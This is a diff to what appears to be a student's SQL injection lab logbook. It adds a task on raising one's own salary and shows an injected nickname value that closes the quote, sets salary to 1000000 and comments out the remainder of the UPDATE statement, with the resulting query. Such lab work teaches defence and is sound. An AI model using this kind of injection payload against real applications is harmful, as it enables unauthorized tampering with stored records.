@@ -87,8 +87,25 @@ $conn->query($sql);
 
 The form looks like this:
 
+![Form2](images/LOGBOOK8/form2.png)
 
+### Task 3.1 - Modify own salary
 
-### Task 3 - Modify own salary
+To do so, the parameters would be
 
-To do so, the parameters are 
+`nickname: <nickname>', salary = 1000000 WHERE nickname = <nickname>; -- `
+
+`email: <anything>`
+
+`address: <anything>`
+
+`password: <anything>`
+
+`phone numer: <anything>`
+
+With that, we reach the following sql coode:
+
+```sql
+UPDATE credential SET
+   nickname=’<nickname>’, salary = 1000000 WHERE nickname = <nickname>; -- email=’$input_email’, address=’$input_address’, Password=’$hashed_pwd’, PhoneNumber=’$input_phonenumber’ WHERE ID=$id;
+```
